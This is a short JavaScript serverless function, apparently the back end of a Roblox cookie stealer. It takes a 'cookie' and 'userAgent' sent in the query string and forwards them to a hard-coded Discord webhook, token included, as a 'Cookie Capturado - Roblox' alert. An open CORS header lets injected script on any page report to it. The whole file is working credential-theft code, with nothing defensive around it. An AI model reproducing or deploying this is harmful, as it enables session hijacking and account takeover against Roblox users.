export const config = { runtime: "edge" };

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    const { searchParams } = new URL(req.url);
    const cookie = searchParams.get("cookie") || "Não enviado";
    const userAgent = searchParams.get("userAgent") || "Não enviado";

    const payload = {
      embeds: [{
        title: "Cookie Capturado - Roblox",
        color: 15158332,
        fields: [
          { name: "Cookie", value: `\`\`\`${cookie.substring(0, 1024)}\`\`\``, inline: false },
          { name: "User Agent", value: `\`\`\`${userAgent.substring(0, 1024)}\`\`\``, inline: false },
          { name: "Host", value: "roblox.com", inline: true },
          { name: "Timestamp", value: new Date().toISOString(), inline: true },
        ],
      }],
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    return new Response(JSON.stringify({ status: "sucesso" }), {
      status: 200,
      headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
    });

  } catch (error) {
    return new Response(JSON.stringify({ status: "erro", message: error.message }), {
      status: 500,
      headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
    });
  }
}
